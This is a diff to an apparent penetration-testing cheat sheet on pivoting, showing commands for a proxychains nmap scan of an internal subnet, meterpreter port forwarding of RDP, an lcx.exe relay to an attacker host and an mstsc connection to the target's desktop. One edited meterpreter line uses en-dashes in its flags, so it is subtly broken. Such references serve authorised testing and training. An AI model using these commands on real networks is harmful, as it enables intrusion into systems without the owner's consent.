@@ -141,9 +141,9 @@ Use proxychains to scan rest of the hosts:
 proxychains4 nmap -sT -Pn -open 192.168.5.0/24
 ```
 
-If you need ports forwarding, it's also available in meterpreter:
+If you need ports forwarding, it's also available in meterpreter: (https://www.offensive-security.com/metasploit-unleashed/portfwd/)
 ```shell
-meterpreter > portfwd add -l 55555 -r 192.168.1.1 -p 3306
+meterpreter > portfwd add –l 3389 –p 3389 –r 192.168.5.100
 ```
 Another popular tool is lcx.exe:
 For attacker:
@@ -154,4 +154,4 @@ For target:
 ```shell
 lcx -slave x.x.x.x 2222 127.0.0.1 3389
 ```
-
+Finally execute ```mstsc x.x.x.x:3333``` to connect to the remote desktop of the target.
